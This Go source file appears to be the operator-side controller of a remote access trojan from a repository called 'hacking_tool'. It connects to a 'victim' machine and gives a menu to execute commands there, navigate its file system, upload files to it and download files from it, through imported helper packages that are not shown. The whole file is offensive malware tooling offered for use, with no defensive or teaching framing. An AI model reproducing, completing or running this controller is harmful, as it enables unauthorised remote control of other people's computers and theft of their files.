package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/didihart/hacking_tool/Hacker/download"
	"github.com/didihart/hacking_tool/Hacker/filenavigation"
	"github.com/didihart/hacking_tool/Hacker/handler"
	"github.com/didihart/hacking_tool/Hacker/upload"
	"github.com/didihart/hacking_tool/commands"
)

func options() {
	fmt.Println()
	fmt.Println("\t[ 01 ]  Execute Command")
	fmt.Println("\t[ 02 ]  Move in File system")
	fmt.Println("\t[ 03 ]  UploadFile")
	fmt.Println("\t[ 04 ]  Download")
	fmt.Println("\t[ 00 ]  Exit")
	fmt.Println()

}

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	IP := ""
	Port := ""
	connection, err := handler.ConnectWithVictim(IP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()
	fmt.Println("[+] Connection established with ", connection.RemoteAddr().String())

	reader := bufio.NewReader(os.Stdin)

	looper := true

	for looper {
		options()
		fmt.Printf("[+] Enter Options ")
		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		connection.Write([]byte(user_input_raw))

		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {
		case user_input == "1":
			fmt.Println("[+] Command Execution program")
			err := commands.ExecuteCommandWindows(connection)
			DisplayError(err)

		case user_input == "2":
			fmt.Println("[+] Navigating File system on Victim")
			err = filenavigation.NavigateSystem(connection)
			DisplayError(err)

		case user_input == "3":
			fmt.Println("[+] Uploading File to the Victim")
			err = upload.UploadFileToVictim(connection)
			DisplayError(err)

		case user_input == "4":
			fmt.Println("[+] Downloading File from the victim ")
			err = download.DownloadFromVictimServer(connection)
			DisplayError(err)

		case user_input == "0":
			fmt.Println("[+] Exiting the program")
			looper = false
		default:
			fmt.Println("[-] Invalid option, try again a")
		}

	}

}
